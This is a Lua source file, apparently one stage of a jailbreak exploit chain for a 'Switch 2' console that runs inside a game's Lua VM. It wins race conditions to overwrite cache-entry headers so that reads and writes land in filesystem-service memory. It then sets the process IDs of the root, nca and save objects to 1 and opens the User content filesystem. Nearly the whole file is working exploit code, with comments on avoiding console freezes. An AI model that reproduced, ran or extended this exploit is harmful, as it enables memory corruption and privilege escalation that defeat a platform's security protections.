-- b_s2_promote.lua - freeze-safe promote stage for the hardened runner.
--
-- Loads the proven save:/s2_promote.lua unchanged. Only when _G.__s2_safe_promote is set
-- (launcher A, exploita2.lua) it replaces three functions:
--   qualify_and_promote, discover_metadata_anchors, retire_and_cleanup_attempt.
-- Without the flag (recovery-mode A = exploita.lua, and B) the original module is returned
-- as is, so those buttons behave exactly as before.
--
-- Why: the chain points one cache entry of the candidate IStorage at FS memory with race
-- writes. A race write can report success and still miss (seen on this console: the period
-- check failed twice with every write "confirmed"). The old code then read through whatever
-- header was still live:
--   * after the period check the live entry is {offset 0x28000, size 0x4141..., buffer B0};
--     a missed first address header made the next read land at B0 + ~64 MiB, past the
--     32 MiB buffer pool, which kills FS and hangs the whole console;
--   * later header moves (more candidates, metadata page, retained array) were not checked
--     either, and a failed attempt's cleanup read through a retired redirected entry.
-- The PC route (upstream ns2jb) avoids all of this; these are its rules, ported:
--   1. every header write needs 2 accepted race windows (upstream fieldCopies = 2);
--   2. after the period check the candidate cache is invalidated (upstream restoreAlias),
--      so a missed first address header reads ordinary RomFS data, never FS memory;
--   3. a header move made while a redirected header is live (metadata page, retained array)
--      happens only if a miss would read memory already read this attempt ("A missed header
--      would not land inside captured native memory"); the old bytes are read first, must not
--      already show the expected proof, and a miss is detected by comparison and retried
--      instead of being taken for the new mapping. A candidate whose header is live and that
--      fails ends the attempt (upstream tries one candidate per run) instead of moving on;
--   4. pool candidates are narrowed with reads inside every candidate pool before any
--      anchor guess is read (upstream resolvePool, <= 4 candidates);
--   5. after a failure with a redirected header possibly live: retire it (2 copies), never
--      read through it again, close the candidate (upstream order).
-- Target: Switch 2 (Ounce) - Seedsow Lullaby (Artemis Lua 5.1 VM)

local SRC = _G.__s2_promote_src or "save:/s2_promote.lua"
local M = dofile(SRC)
if not _G.__s2_safe_promote then
    return M
end

local P    = require("s2_prim")
local FS   = require("s2_fs")
local RACE = require("s2_race")

local math_floor, math_min, math_abs = math.floor, math.min, math.abs
local str_byte, str_sub, str_rep, str_format = string.byte, string.sub, string.rep, string.format
local tbl_concat = table.concat

local BLOCK        = 0x4000
local WITHIN       = {0, 0x40, 0x140, 0x200}
local FIELD_COPIES = 2       -- accepted race windows per header write
local MOVE_TRIES   = 3       -- header moves retried after a detected miss
local ARRAY_TRIES  = 6       -- as before
local NARROW_READS = 64      -- pool narrowing reads (upstream allows 512)
local DECIDABLE    = 4       -- upstream DECIDABLE_CANDIDATES
local ZERO_56      = str_rep("\0", 56)
local RETIRE_BYTES = {0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
                      0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42}

M.SAFE_PROMOTE = true

-- ---------------------------------------------------------------------------
-- Memory read through a verified header this attempt (merged [start, end) ranges).
-- ---------------------------------------------------------------------------
local function new_known()
    local K = {ranges = {}}
    function K.add(a, n)
        if not a or not n or n <= 0 then return end
        local r = K.ranges
        r[#r + 1] = {a, a + n}
        table.sort(r, function(x, y) return x[1] < y[1] end)
        local out = {}
        for i = 1, #r do
            local cur = r[i]
            local last = out[#out]
            if last and cur[1] <= last[2] then
                if cur[2] > last[2] then last[2] = cur[2] end
            else
                out[#out + 1] = {cur[1], cur[2]}
            end
        end
        K.ranges = out
    end
    function K.has(a, n)
        for i = 1, #K.ranges do
            local x = K.ranges[i]
            if a >= x[1] and a + n <= x[2] then return true end
        end
        return false
    end
    return K
end

-- The current verified (live) header and its known memory, for the read recorder below.
local REC = nil

-- Every read through the live, verified plan adds to the known set. discover / inspect call
-- M.read_fs_address_bytes through the module table, so they are recorded too.
local orig_read = M.read_fs_address_bytes
function M.read_fs_address_bytes(rt, fs, config, plan, ch, address, length, buf, win)
    local r = orig_read(rt, fs, config, plan, ch, address, length, buf, win)
    if r.ok and REC and plan == REC.live then
        REC.known.add(address, length)
    end
    return r
end

-- ---------------------------------------------------------------------------
-- Lower-window plan whose read offset is >= min_read, so that a missed move made from a
-- live header with that read offset lands at or after the live target (in memory already
-- read). Same encoding and layout as s2_fs build_signed_cache_plan / build_lower_window_plan.
-- ---------------------------------------------------------------------------
local function plan_at_least(target, storage_size, cycle, pointers, min_read)
    local ok_b, base = pcall(FS.build_lower_window_plan, target, storage_size, cycle, pointers)
    if not ok_b or not base then return nil end
    if not min_read or base.readOffset >= min_read then return base end
    local prefix = base.lowerWindow.prefix
    local low    = target - prefix
    local need   = min_read - prefix
    local start  = math_floor(need / cycle) * cycle
    while start + prefix + BLOCK <= storage_size do
        for _, within in ipairs(WITHIN) do
            local ro = start + within
            if ro >= need and ro + prefix + BLOCK <= storage_size then
                local bias = low - ro
                local enc = FS.encode_signed_cache_offset(bias, cycle / BLOCK)
                if enc then
                    local bytes = {}
                    for i = 1, 0x28 do bytes[i] = 0x41 end
                    for i = 1, 8 do bytes[i] = enc.bytes[i] end
                    for i = 9, 16 do bytes[i] = 0x7E end
                    for i = 17, 20 do bytes[i] = 1 end
                    for i = 1, 8 do bytes[0x20 + i] = enc.base_bytes[i] end
                    local plan = {
                        target      = target,
                        storageSize = storage_size,
                        readOffset  = ro + prefix,
                        addressBias = bias,
                        cycle       = cycle,
                        offsetBytes = enc.bytes,
                        baseBytes   = enc.base_bytes,
                        bytes       = bytes,
                        str         = P.bytes_to_str(bytes),
                        lowerWindow = {
                            lowestObservedPointer = base.lowerWindow.lowestObservedPointer,
                            proposedStart         = low,
                            prefix                = prefix,
                            qualification         = "lower mapping remains unverified",
                        },
                    }
                    if plan.addressBias + plan.readOffset ~= target or
                       ((math_floor(plan.readOffset / BLOCK) * BLOCK) % cycle) ~= 0 then
                        return nil
                    end
                    return plan
                end
            end
        end
        start = start + cycle
    end
    return nil
end
M.plan_at_least = plan_at_least

-- One header write = FIELD_COPIES accepted race windows (single-step headers only here).
local function write_header(rt, fs, setup, config, cs, bytes, name, log_fn, should_stop)
    local waves = 0
    for copy = 1, FIELD_COPIES do
        local r = RACE.install_address_header(rt, fs, setup, config, cs, bytes,
            name .. "#" .. copy, log_fn, should_stop)
        waves = waves + (r.wavesTotal or 0)
        if not r.ok or not cs.workerStateSafe then return false, waves end
    end
    return true, waves
end
M.write_header_twice = write_header

-- ---------------------------------------------------------------------------
-- discover_metadata_anchors with upstream's pool narrowing (find-metadata.cjs resolvePool).
-- ---------------------------------------------------------------------------
local function scan_links(chunk_str, source_address, seed, links, seen)
    local length = #chunk_str
    local off = (BLOCK - (source_address % BLOCK)) % BLOCK
    while (off + 64) <= length do
        local val = P.u64(chunk_str, off)
        if val > 0x100000000 and val < 549755813888 and (val % BLOCK) == 0 and
           math_abs(val - seed) < 0x2000000 then
            local src = source_address + off
            local key = str_format("%x:%x", src, val)
            if not seen[key] then
                seen[key] = true
                links[#links + 1] = {source = src, value = val,
                    zeroTail = (str_sub(chunk_str, off + 9, off + 64) == ZERO_56)}
            end
        end
        off = off + BLOCK
    end
end

function M.discover_metadata_anchors(rt, fs, config, seed_plan, candidate_handle, capture_buf, log_fn)
    local function log(msg) if log_fn then log_fn(msg) end end
    local CHUNK = config.ROOT_CAPTURE_CHUNK
    local seed = seed_plan.target
    local src_len = 0x500000
    local src_win = {start = seed, ["end"] = seed + src_len}
    local links, seen = {}, {}
    for chunk_idx = 0, (src_len / CHUNK) - 1 do
        local chunk_addr = seed + chunk_idx * CHUNK
        local cr = M.read_fs_address_bytes(rt, fs, config, seed_plan, candidate_handle,
            chunk_addr, CHUNK, capture_buf, src_win)
        if not cr.ok then
            return {ok = false, anchors = {}, error = cr.error}
        end
        scan_links(cr.str, chunk_addr, seed, links, seen)
    end
    if #links == 0 then
        log("METADATA: no native links in the pool capture")
        return {ok = true, anchors = {}}
    end

    local bounds = FS.derive_pool_bounds(links, seed)
    local captures = {{address = seed, length = src_len}}
    local reads = 0
    while #bounds.candidates > DECIDABLE and reads < NARROW_READS do
        -- Only a bucket inside every remaining candidate pool (so inside the real one).
        local start = FS.choose_pool_refinement_start(bounds, links, captures,
            seed_plan.addressBias, CHUNK, reads)
        if not start then break end
        local cr = M.read_fs_address_bytes(rt, fs, config, seed_plan, candidate_handle,
            start, CHUNK, capture_buf, {start = start, ["end"] = start + CHUNK})
        if not cr.ok then break end
        captures[#captures + 1] = {address = start, length = CHUNK}
        scan_links(cr.str, start, seed, links, seen)
        bounds = FS.derive_pool_bounds(links, seed)
        reads = reads + 1
    end
    log(str_format("METADATA: %d link(s), %d pool candidate(s) after %d narrowing read(s)",
        #links, #bounds.candidates, reads))

    local anchors, anchor_seen = {}, {}
    for ci, pool_start in ipairs(bounds.candidates) do
        local anchor_addr = pool_start + 0x3a00000
        local aligned_start = seed_plan.addressBias +
            math_floor((anchor_addr - seed_plan.addressBias) / CHUNK) * CHUNK
        local anchor_off = anchor_addr - aligned_start
        local anchor_len = anchor_off + 0x1000
        local awin = {start = aligned_start, ["end"] = aligned_start + anchor_len}
        local ra = M.read_fs_address_bytes(rt, fs, config, seed_plan, candidate_handle,
            aligned_start, anchor_len, capture_buf, awin)
        local rb = ra.ok and M.read_fs_address_bytes(rt, fs, config, seed_plan, candidate_handle,
            aligned_start, anchor_len, capture_buf, awin) or {ok = false}
        if ra.ok and rb.ok then
            local slice_a = str_sub(ra.str, anchor_off + 1, anchor_off + 24)
            local slice_b = str_sub(rb.str, anchor_off + 1, anchor_off + 24)
            if slice_a == slice_b and #slice_a == 24 then
                local ext = FS.parse_external_link(P.u64(slice_a, 0), P.u64(slice_a, 8),
                    P.u64(slice_a, 16), anchor_addr)
                if ext then
                    local mwin = FS.metadata_window_from_next(ext.next)
                    if mwin and (mwin.anchorOffset + 16) <= mwin.length then
                        local k = str_format("%x:%x", mwin.address, anchor_addr)
                        if not anchor_seen[k] then
                            anchor_seen[k] = true
                            anchors[#anchors + 1] = {
                                poolStart   = pool_start,
                                nodeAddress = anchor_addr,
                                next        = ext.next,
                                extent      = ext.extent,
                                window      = mwin,
                            }
                            log(str_format("METADATA: valid anchor node=0x%x page=0x%x extent=0x%x (candidate %d/%d)",
                                anchor_addr, mwin.address, ext.extent, ci, #bounds.candidates))
                            break
                        end
                    end
                end
            end
        end
    end
    return {ok = true, anchors = anchors}
end

-- ---------------------------------------------------------------------------
-- qualify_and_promote
-- ---------------------------------------------------------------------------
local function make_cache_entry_str(offset, address)
    local s = str_rep("\0", 0x30)
    s = P.put_u64(s, 0x00, offset)
    s = P.put_u64(s, 0x08, 0x4000)
    s = P.put_u8(s,  0x10, 1)
    s = P.put_u8(s,  0x11, 1)
    s = P.put_u8(s,  0x12, 1)
    s = P.put_u64(s, 0x20, address)
    s = P.put_u64(s, 0x28, 0x4000)
    return s
end

local function qualify_inner(rt, fs, setup, config, campaign_state, alias_res, pointer_candidates, log_fn, should_stop)
    local function log(msg) if log_fn then log_fn(msg) end end
    local candidate_handle = alias_res.candidateHandle
    local prime_hex        = alias_res.primeHex
    local storage_size     = config.STORAGE_SIZE
    local CHUNK            = config.ROOT_CAPTURE_CHUNK
    local cs               = campaign_state

    local known = new_known()
    local state = {live = nil, known = known}     -- live = verified plan whose header is in place
    REC = state

    local function fail(reason)
        return {ok = false, failureReason = reason}
    end
    log("PROMOTE: freeze-safe mode (2 race windows per header, clean cache first, guarded moves)")

    -- Candidate selection: unchanged.
    local pcs, seen_targets, all_targets = {}, {}, {}
    for _, pc in ipairs(pointer_candidates) do
        all_targets[#all_targets + 1] = pc.target
        if pc.strength == 3 and pc.changedLink and not seen_targets[pc.target] then
            seen_targets[pc.target] = true
            pcs[#pcs + 1] = pc
        end
    end
    table.sort(pcs, function(a, b) return a.target < b.target end)
    if #pcs == 0 then return fail("no-strength-3-changed-link-target") end

    local candidate_plans = {}
    for i = 1, math_min(#pcs, config.MAX_ADDRESS_CANDIDATES) do
        local ok_p, plan = pcall(FS.build_lower_window_plan, pcs[i].target, storage_size, 0x28000, all_targets)
        if ok_p and plan and fs.check_address_header_encoding(plan.bytes, setup.handles.savedHandle).ok then
            candidate_plans[#candidate_plans + 1] = {candidate = pcs[i], plan = plan}
        end
    end
    if #candidate_plans == 0 then return fail("no-valid-address-plans") end

    local ctrl_buf    = rt.alloc_page(0x1000)
    local capture_buf = rt.alloc_page(CHUNK + 0x2000)
    local ord_buf     = rt.alloc_page(BLOCK + 0x1000)
    local buf_a       = rt.alloc_page(BLOCK + 0x1000)
    local buf_b       = rt.alloc_page(BLOCK + 0x1000)
    local before_buf  = rt.alloc_page(BLOCK + 0x1000)

    -- [safe 1] Period check with two accepted windows per write.
    alias_res.activeReadOffset = 0x28000
    rt.memset(ctrl_buf, 0xA5, 16)
    if fs.ipc_storage_read(setup.handles.storageHandle, 0x28000, 16, ctrl_buf).error ~= 0 then
        return fail("cache-bucket-period-unqualified")
    end
    if not write_header(rt, fs, setup, config, cs, {0xC2, 0x80, 0x02}, "cache-period-prefix", log_fn, should_stop) or
       not write_header(rt, fs, setup, config, cs, {}, "cache-period-zero", log_fn, should_stop) then
        return fail("cache-bucket-period-unqualified")
    end
    rt.memset(ctrl_buf, 0xA5, 16)
    local pr = fs.ipc_storage_read(candidate_handle, 0x28000, 16, ctrl_buf)
    if pr.error ~= 0 or P.hex(rt.rd(ctrl_buf, 16)) ~= prime_hex then
        return fail("cache-bucket-period-unqualified")
    end

    -- [safe 2] Clean cache before the first redirected header (upstream restoreAlias). The
    -- period entry is still clean (dirty byte 0), so invalidating it is allowed. Also used after
    -- a plain-data miss: that read cached the RomFS block, which could hide the next write.
    local function restore_clean()
        if fs.ipc_storage_invalidate(candidate_handle, 0, storage_size or 0x40000000) ~= 0 then
            return false, "clean-restore-invalidate-failed"
        end
        rt.memset(ctrl_buf, 0xA5, 16)
        local rr = fs.ipc_storage_read(candidate_handle, 0, 16, ctrl_buf)
        if rr.error ~= 0 or P.hex(rt.rd(ctrl_buf, 16)) ~= prime_hex then
            return false, "clean-restore-prefix-mismatch"
        end
        return true
    end
    local ok_c, why_c = restore_clean()
    if not ok_c then return fail(why_c) end
    log("PROMOTE: period OK; candidate cache invalidated, a missed header now reads plain RomFS data")

    -- [safe 3] Prepare a header move. With a live redirected header a missed write keeps the
    -- old mapping, so the new read offset would read old.addressBias + readOffset: allow the
    -- move only if that is memory already read, and keep its bytes to recognise a miss. The
    -- proof the caller looks for after the write must not already be in those bytes
    -- (upstream: "The proposed metadata anchor also matches the old mapping").
    local function prepare_move(next_plan, probe_len, name, proof_in)
        local live = state.live
        if not live then return true, nil end
        local fb = live.addressBias + next_plan.readOffset
        if not known.has(fb, probe_len) then
            log(str_format("PROMOTE: not moving %s: a missed write would read 0x%x+0x%x (not read yet)",
                name, fb, probe_len))
            return false, "unsafe-move-" .. name
        end
        rt.memset(before_buf, 0xA5, probe_len)
        local r0 = fs.ipc_storage_read(candidate_handle, next_plan.readOffset, probe_len, before_buf)
        if r0.error ~= 0 then return false, "pre-move-read-failed-" .. name end
        local before = rt.rd(before_buf, probe_len)
        if proof_in and proof_in(before) then
            log(str_format("PROMOTE: not moving %s: the old mapping already shows the expected bytes", name))
            return false, "ambiguous-move-" .. name
        end
        return true, before
    end

    local verified_root = nil
    local winner = nil

    for ai = 1, #candidate_plans do
        if should_stop and should_stop() then break end
        -- A failed candidate whose header is live is not moved to the next candidate: two freed
        -- pool blocks can read the same, so a landed move could not be told from a miss. Like
        -- upstream (one candidate per run), the attempt ends; cleanup retires and retries.
        if state.live then
            log(str_format("PROMOTE: candidate %d did not verify with its header live; ending this attempt", ai - 1))
            break
        end
        local cand = candidate_plans[ai].candidate
        local plan = candidate_plans[ai].plan
        local name = "cache-address-" .. ai
        local hit = false
        rt.memset(ord_buf, 0xA5, BLOCK)
        if fs.ipc_storage_read(setup.handles.storageHandle, plan.readOffset, BLOCK, ord_buf).error ~= 0 then
            return fail("ordinary-read-failed")
        end
        alias_res.signedHeaderMayBeLive = true
        alias_res.activeReadOffset = plan.readOffset
        for t = 1, MOVE_TRIES do
            if not write_header(rt, fs, setup, config, cs, plan.bytes, name, log_fn, should_stop) then
                return fail("address-header-install-failed")
            end
            rt.memset(buf_a, 0xA5, BLOCK)
            rt.memset(buf_b, 0x5A, BLOCK)
            local ra = fs.ipc_storage_read(candidate_handle, plan.readOffset, BLOCK, buf_a)
            local rb = fs.ipc_storage_read(candidate_handle, plan.readOffset, BLOCK, buf_b)
            if ra.error ~= 0 or rb.error ~= 0 then return fail("address-read-failed") end
            if rt.buffers_equal_fast(buf_a, ord_buf, BLOCK) then
                -- Clean cache, so a miss reads plain RomFS data (never FS memory). No redirect
                -- is live, so the cached plain block can be dropped before the next write.
                log(str_format("PROMOTE: %s missed (plain data), try %d/%d", name, t, MOVE_TRIES))
                local ok_r, why_r = restore_clean()
                if not ok_r then return fail(why_r) end
            else
                state.live = plan
                if rt.buffers_equal_fast(buf_a, buf_b, BLOCK) and rt.has_byte_different_fast(buf_a, BLOCK, 0xA5) then
                    known.add(plan.target, BLOCK)
                    hit = true
                else
                    log(str_format("PROMOTE: %s read is unstable or poison; not using it", name))
                end
                break
            end
        end

        if hit then
            log(str_format("PROMOTE: candidate %d target=0x%x readOffset=0x%x live", ai, plan.target, plan.readOffset))
            local md = M.discover_metadata_anchors(rt, fs, config, plan, candidate_handle, capture_buf, log_fn)
            for mi = 1, #(md.anchors or {}) do
                local anchor = md.anchors[mi]
                local page   = anchor.window.address
                local plen   = anchor.window.length
                local pts    = {}
                for k = 1, #all_targets do pts[k] = all_targets[k] end
                pts[#pts + 1] = math_floor(page / BLOCK) * BLOCK
                local mplan = plan_at_least(page, storage_size, CHUNK, pts, state.live.readOffset)
                if mplan and fs.check_address_header_encoding(mplan.bytes, setup.handles.savedHandle).ok then
                    local mname = "cache-meta-" .. mi
                    local aoff = anchor.window.anchorOffset
                    local ok_mm, mbefore = prepare_move(mplan, plen, mname, function(old)
                        return P.u64(old, aoff) == anchor.nodeAddress and P.u64(old, aoff + 8) == anchor.nodeAddress
                    end)
                    if not ok_mm then
                        if type(mbefore) == "string" and str_sub(mbefore, 1, 4) == "pre-" then return fail(mbefore) end
                        break
                    end
                    alias_res.activeReadOffset = mplan.readOffset
                    local pwin = {start = page, ["end"] = page + plen}
                    local meta_ok = false
                    for t = 1, MOVE_TRIES do
                        if not write_header(rt, fs, setup, config, cs, mplan.bytes, mname, log_fn, should_stop) then
                            return fail("address-header-install-failed")
                        end
                        local pa = M.read_fs_address_bytes(rt, fs, config, mplan, candidate_handle, page, plen, buf_a, pwin)
                        if pa.ok and mbefore and pa.str == mbefore then
                            log(str_format("PROMOTE: %s missed (old mapping still live), try %d/%d", mname, t, MOVE_TRIES))
                        else
                            state.live = mplan
                            local pb = pa.ok and M.read_fs_address_bytes(rt, fs, config, mplan, candidate_handle, page, plen, buf_b, pwin) or {ok = false}
                            if pa.ok and pb.ok and P.u64(pa.str, aoff) == anchor.nodeAddress and
                               P.u64(pa.str, aoff + 8) == anchor.nodeAddress and
                               P.u64(pb.str, aoff) == anchor.nodeAddress then
                                known.add(page, plen)
                                meta_ok = true
                            else
                                log(str_format("PROMOTE: %s page does not show the anchor links", mname))
                            end
                            break
                        end
                    end
                    if meta_ok then
                        local id_res = M.inspect_fsp_identity_targets(rt, fs, config, mplan, candidate_handle, capture_buf, log_fn)
                        if id_res.ok then
                            local wh = (cand.changedHeader and cand.changedHeader > 0)
                                and ((cand.changedHeader == 8) and "8" or str_format("0x%x", cand.changedHeader))
                                or (cand.zeroTail and "zeroTail" or "zeroAfter32")
                            log(str_format("PROMOTE MATCH: target=0x%x hdr=%s strength=%d", cand.target, wh, cand.strength))
                            verified_root = id_res
                            winner = cand
                            setup.handles.domainSession = id_res.domainSession
                            break
                        end
                    end
                end
            end
        end
        if verified_root then break end
    end

    if not verified_root then
        return fail("root-identity-not-verified")
    end

    local targets        = verified_root.verifiedIdentityTargets
    local domain_session = verified_root.domainSession
    local layout         = targets.retainedCache
    local array_addr     = layout.array
    local owner_addr     = layout.owner

    local array_plan = plan_at_least(array_addr, storage_size, CHUNK,
        {math_floor(array_addr / BLOCK) * BLOCK}, state.live.readOffset)
    if not array_plan or not fs.check_address_header_encoding(array_plan.bytes, setup.handles.savedHandle).ok then
        return fail("retained-array-encoding-rejected")
    end
    local ok_am, abefore = prepare_move(array_plan, 0x5A0, "cache-retained-array", function(old)
        return str_sub(old, 1, 16) == str_sub(array_plan.str, 1, 16)
    end)
    if not ok_am then return fail(abefore or "unsafe-move-cache-retained-array") end
    local before_arr = nil
    alias_res.activeReadOffset = array_plan.readOffset
    for t = 1, ARRAY_TRIES do
        if not write_header(rt, fs, setup, config, cs, array_plan.bytes, "cache-retained-array", log_fn, should_stop) then
            return fail("retained-array-plan-install-failed")
        end
        local probe = M.read_fs_address_bytes(rt, fs, config, array_plan, candidate_handle, array_addr, 0x5A0, capture_buf)
        if probe.ok and abefore and probe.str == abefore then
            log(str_format("PROMOTE: cache-retained-array missed (old mapping still live), try %d/%d", t, ARRAY_TRIES))
        elseif probe.ok and str_sub(probe.str, 1, 16) == str_sub(array_plan.str, 1, 16) then
            state.live = array_plan
            before_arr = probe
            break
        else
            -- Not the old bytes and not our header: stop here rather than guess what is live.
            state.live = array_plan
            log("PROMOTE: cache-retained-array read shows neither the old page nor the header")
            break
        end
    end
    if not before_arr then
        return fail("retained-array-snapshot-failed")
    end
    alias_res.retainedEndpointActive = true
    local active_plan = array_plan

    -- From here on unchanged from s2_promote.lua (retained endpoint, PID=1, final access).
    local write_buf = rt.alloc_page(0x1000)
    local function logical_read(off, len)
        rt.memset(capture_buf, 0xA5, len)
        local r = fs.ipc_storage_read(candidate_handle, off, len, capture_buf)
        assert(r.transport == 0 and r.error == 0, "logical_read failed")
        return rt.rd(capture_buf, len)
    end
    local function logical_write(off, data_str)
        rt.wr(write_buf, data_str)
        local r = fs.ipc_storage_write(candidate_handle, off, write_buf, #data_str)
        assert(r.transport == 0 and r.error == 0, "logical_write failed")
    end
    local function bootstrap_write(addr, data_str)
        local off = addr - active_plan.addressBias
        logical_write(off, data_str)
        local rb = M.read_fs_address_bytes(rt, fs, config, active_plan, candidate_handle, addr, #data_str, buf_a)
        assert(rb.ok and rb.str == data_str, "bootstrap_write readback differs")
    end
    if str_sub(before_arr.str, 0x31, 0x5A0) ~= str_rep("\0", 0x5A0 - 0x30) then
        bootstrap_write(array_addr + 0x30, str_rep("\0", 0x5A0 - 0x30))
    end

    local data_offset       = 0x4000
    local data_entry_offset = 0x90
    local scratch_offset    = 0x5A0 - 0x18

    bootstrap_write(array_addr + data_entry_offset, make_cache_entry_str(data_offset, array_addr))

    logical_write(data_offset, make_cache_entry_str(0, array_addr))
    local ctrl_arr = logical_read(0, 0x5A0)
    assert(P.u64(ctrl_arr, 0) == 0 and P.u64(ctrl_arr, 8) == 0x4000, "retained control descriptor invalid")

    local ep = {
        array           = array_addr,
        owner           = owner_addr,
        arrayLength     = 0x5A0,
        dataOffset      = data_offset,
        dataEntryOffset = data_entry_offset,
        scratchOffset   = scratch_offset,
        pointer         = array_addr,
        canonical       = true,
        ready           = true
    }

    local function set_retained_pointer(target_addr)
        local entry_s = logical_read(ep.dataEntryOffset, 0x30)
        assert(P.u64(entry_s, 0) == ep.dataOffset and P.u64(entry_s, 8) == 0x4000 and
            str_byte(entry_s, 0x11) == 1 and P.u64(entry_s, 0x20) == ep.pointer,
            "retained data descriptor changed")
        if target_addr ~= ep.pointer then
            local p8 = P.u64s(target_addr)
            logical_write(ep.dataEntryOffset + 0x20, p8)
            assert(logical_read(ep.dataEntryOffset + 0x20, 8) == p8, "retained pointer readback differs")
            ep.pointer = target_addr
        end
    end

    local function retained_read(addr, len)
        local out = {}
        local at = 0
        while at < len do
            local take = math_min(0x4000, len - at)
            set_retained_pointer(addr + at)
            out[#out + 1] = logical_read(ep.dataOffset, take)
            at = at + take
        end
        return tbl_concat(out)
    end

    local function retained_write(addr, data_str)
        local at = 0
        while at < #data_str do
            local part = str_sub(data_str, at + 1, math_min(at + 0x4000, #data_str))
            set_retained_pointer(addr + at)
            logical_write(ep.dataOffset, part)
            assert(logical_read(ep.dataOffset, #part) == part, "retained write readback differs")
            at = at + #part
        end
    end

    set_retained_pointer(owner_addr)
    local owner_before = logical_read(data_offset, 0x78)
    assert(P.u32(owner_before, 0x58) == 10, "retained owner count before disable ~= 10")
    logical_write(data_offset + 0x58, P.u32s(0))
    local owner_after = logical_read(data_offset, 0x78)
    assert(P.u32(owner_after, 0x58) == 0, "retained owner count after disable ~= 0")

    for _, field in ipairs(targets.fields) do
        local cur = retained_read(field.object, field.objectSize)
        assert(cur == field.beforeStr, field.name .. " changed before PID write")
        if field.before ~= 1 then
            retained_write(field.object + field.pidOffset, P.u64s(1))
        end
        local expected = P.put_u64(field.beforeStr, field.pidOffset, 1)
        local after = retained_read(field.object, field.objectSize)
        assert(after == expected, field.name .. " PID=1 verification failed")
    end
    set_retained_pointer(array_addr)
    log("PROMOTION: all 3 objects (root, nca, save) verified with PID=1")

    local cmd110_pkt = P.domain_packet(domain_session.rootObj, 110, P.u32s(1))
    local open_rep = fs.send_packet(domain_session.handle, cmd110_pkt, setup.pktBuf, {domain = true, data_size = 0})
    assert(open_rep.transport == 0 and open_rep.result == 0 and #open_rep.objects == 1,
        "OpenContentStorageFileSystem(User=1) failed")
    local user_fs_obj = open_rep.objects[1]
    local user_fs_h   = fs.clone_object(domain_session.handle, user_fs_obj)
    assert(user_fs_h ~= 0, "clone User content filesystem failed")
    local listing = fs.ipc_list_directory(user_fs_h, "/", 3)
    rt.close_handle(user_fs_h)
    fs.close_domain_object_now(domain_session.handle, user_fs_obj, setup.pktBuf)
    assert(listing.error == 0, "User content root listing failed")
    log(str_format("FINAL ACCESS: User content root listed (%d entries)", #listing.entries))

    _G.fspSrv = domain_session
    _G.fsKaihen = {
        domainSession   = {handle = domain_session.handle, rootObj = domain_session.rootObj},
        candidateHandle = candidate_handle,
        storageSize     = storage_size,
        endpoint        = {
            array           = ep.array,
            owner           = ep.owner,
            arrayLength     = ep.arrayLength,
            dataOffset      = ep.dataOffset,
            dataEntryOffset = ep.dataEntryOffset,
            scratchOffset   = ep.scratchOffset
        },
        domainLayout    = targets.domainLayout,
        identityObjects = {
            {name = "root", object = targets.fields[1].object, objectSize = 0x40, pidOffset = 0x30, pid = targets.fields[1].before},
            {name = "nca",  object = targets.fields[2].object, objectSize = 0x60, pidOffset = 0x20, pid = targets.fields[2].before},
            {name = "save", object = targets.fields[3].object, objectSize = 0x60, pidOffset = 0x28, pid = targets.fields[3].before},
        }
    }
    _G.__s2_promote_diag = {target = winner and winner.target, live = state.live and state.live.target}

    return {
        ok                = true,
        promotionRetained = true,
        domainSession     = domain_session,
        retainedEndpoint  = ep
    }
end

function M.qualify_and_promote(rt, fs, setup, config, campaign_state, alias_res, pointer_candidates, log_fn, should_stop)
    local ok, res = pcall(qualify_inner, rt, fs, setup, config, campaign_state, alias_res,
        pointer_candidates, log_fn, should_stop)
    REC = nil
    if ok then return res end
    if log_fn then log_fn("PROMOTE: error " .. tostring(res)) end
    return {ok = false, failureReason = "promote-error: " .. tostring(res)}
end

-- ---------------------------------------------------------------------------
-- Cleanup: with a redirected header possibly live, retire it with two copies and never
-- read through it again (its buffer pointer is synthetic); then close the candidate so the
-- original cleanup skips its own retire + read-back. Everything else is the original.
-- ---------------------------------------------------------------------------
local orig_cleanup = M.retire_and_cleanup_attempt
function M.retire_and_cleanup_attempt(rt, fs, setup, config, campaign_state, alias_res, promoted_ok, log_fn)
    local handles = setup and setup.handles
    local workers_safe = (campaign_state == nil) or (campaign_state.workerStateSafe == true)
    if promoted_ok or not alias_res or not alias_res.signedHeaderMayBeLive or
       alias_res.retainedEndpointActive or not workers_safe or
       not handles or not handles.candidateHandle or handles.candidateHandle == 0 then
        return orig_cleanup(rt, fs, setup, config, campaign_state, alias_res, promoted_ok, log_fn)
    end
    if log_fn then log_fn("RETIRE: redirected header may be live; clearing its valid byte (2 copies, no read-back through it)") end
    local ok_r = write_header(rt, fs, setup, config, campaign_state, RETIRE_BYTES, "cache-retire", log_fn, nil)
    if not ok_r or not campaign_state.workerStateSafe then
        if log_fn then log_fn("RETIRE: not confirmed; leaving every handle open") end
        return {ok = true, safeToRetry = false}
    end
    rt.close_handle(handles.candidateHandle)
    handles.candidateHandle = 0
    alias_res.candidateCacheNeedsRetirement = false
    return orig_cleanup(rt, fs, setup, config, campaign_state, alias_res, promoted_ok, log_fn)
end

return M
